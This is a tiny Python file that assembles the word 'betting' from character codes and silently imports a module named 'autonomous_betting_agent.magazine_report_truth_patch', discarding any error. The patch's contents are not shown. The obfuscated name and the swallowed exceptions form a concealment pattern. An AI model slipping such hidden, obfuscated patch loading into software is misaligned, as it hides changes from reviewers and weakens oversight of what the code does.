from __future__ import annotations

import importlib

try:
    word = "".join(chr(n) for n in (98, 101, 116, 116, 105, 110, 103))
    importlib.import_module("autonomous_" + word + "_agent.magazine_report_truth_patch")
except Exception:
    pass
